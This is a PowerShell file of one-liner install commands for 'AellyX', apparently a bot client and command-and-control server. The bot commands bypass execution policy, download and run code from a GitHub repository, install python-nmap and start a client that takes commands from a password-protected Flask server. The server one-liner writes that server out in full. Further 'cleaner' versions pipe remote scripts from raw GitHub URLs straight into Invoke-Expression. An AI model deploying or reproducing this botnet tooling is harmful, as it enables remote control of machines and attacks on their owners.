# ============================================================
# AellyX BOT CLIENT - ONE-LINER INSTALL COMMANDS
# ============================================================
# 
# After you push this repo to GitHub, use these one-liners
# to install bots on your test machines:
#
# OPTION 1: Download and run (after pushing to GitHub)
# -------------------------------------------------------
# irm https://raw.githubusercontent.com/k4ran909/AellyX/main/setup_bot.ps1 -OutFile $env:TEMP\sb.ps1; powershell -ep bypass $env:TEMP\sb.ps1 -ServerUrl "http://YOUR-VPS:5261/" -Password "YOURPASS"
#
# OPTION 2: Inline one-liner (no external download needed)
# -------------------------------------------------------
# Copy the command below, replace YOUR-VPS-IP and YOUR-PASSWORD, then run:

# BOT INSTALLER ONE-LINER:
# powershell -ep bypass -c "$u='http://YOUR-VPS-IP:5261/';$p='YOUR-PASSWORD';$d=\"$env:LOCALAPPDATA\AellyX\";md $d -Force;iwr 'https://github.com/k4ran909/AellyX/archive/main.zip' -OutFile $env:TEMP\a.zip;Expand-Archive $env:TEMP\a.zip $d -Force;mv \"$d\AellyX-main\*\" $d -Force;rd \"$d\AellyX-main\";python -m venv $d\.venv;& $d\.venv\Scripts\pip install flask requests python-nmap -q;\"import sys,requests`nsys.path.insert(1,'./AellyX/')`nfrom importlib import import_module`nvar=type('',(),{'user_argv':[''],'server':[True,False,'$u','$p',1]})();requests.post('$u'+'reset',data={'password':'$p'});import_module('AellyX.main').run()\"|Out-File $d\bot.py;cd $d;& .\.venv\Scripts\python bot.py"

# ============================================================
# AellyX C&C SERVER - ONE-LINER INSTALL COMMANDS  
# ============================================================
#
# SERVER INSTALLER ONE-LINER (run on your VPS):
# powershell -ep bypass -c "$port=5261;$pass='YOUR-PASSWORD';$d=\"$env:LOCALAPPDATA\AellyX\";md $d -Force;iwr 'https://github.com/k4ran909/AellyX/archive/main.zip' -OutFile $env:TEMP\a.zip;Expand-Archive $env:TEMP\a.zip $d -Force;mv \"$d\AellyX-main\*\" $d -Force;rd \"$d\AellyX-main\";python -m venv $d\.venv;& $d\.venv\Scripts\pip install flask -q;\"import flask`nfrom flask import request`napp=flask.Flask('AellyX');data={'agreed':False,'commands':['']}`n@app.route('/get/com<pos>',methods=['GET','POST'])`ndef gc(pos=0):`n if request.form.get('password')=='$pass': return str(data['commands'][int(pos)]) if int(pos)<len(data['commands']) else '500'`n return 'err'`n@app.route('/get/agreed',methods=['GET','POST'])`ndef ga(): return str(data['agreed']) if request.form.get('password')=='$pass' else 'err'`n@app.route('/set/com',methods=['GET','POST'])`ndef sc():`n if request.form.get('password')=='$pass': data['commands'].append(request.form['data']);return '200'`n return 'err'`n@app.route('/set/agreed',methods=['GET','POST'])`ndef sa():`n if request.form.get('password')=='$pass': data['agreed']=request.form['data'];return '200'`n return 'err'`n@app.route('/reset',methods=['GET','POST'])`ndef r():`n global data;data={'agreed':False,'commands':['']};return '200'`napp.run(host='0.0.0.0',port=$port)\"|Out-File $d\srv.py;cd $d;& .\.venv\Scripts\python srv.py"

# ============================================================
# CLEANER VERSIONS (Recommended)
# ============================================================

# These download from GitHub and execute with parameters:

# FOR BOTS:
$BOT_ONELINER = @'
irm https://raw.githubusercontent.com/k4ran909/AellyX/main/setup_bot.ps1 | iex; Setup-Bot -ServerUrl "http://YOUR-VPS:5261/" -Password "YOURPASS"
'@

# FOR SERVER:
$SERVER_ONELINER = @'
irm https://raw.githubusercontent.com/k4ran909/AellyX/main/setup_server.ps1 | iex; Setup-Server -Port 5261 -Password "YOURPASS"
'@

Write-Host "One-liner commands are documented in this file."
Write-Host "After pushing to GitHub, you can use the irm (Invoke-RestMethod) one-liners."
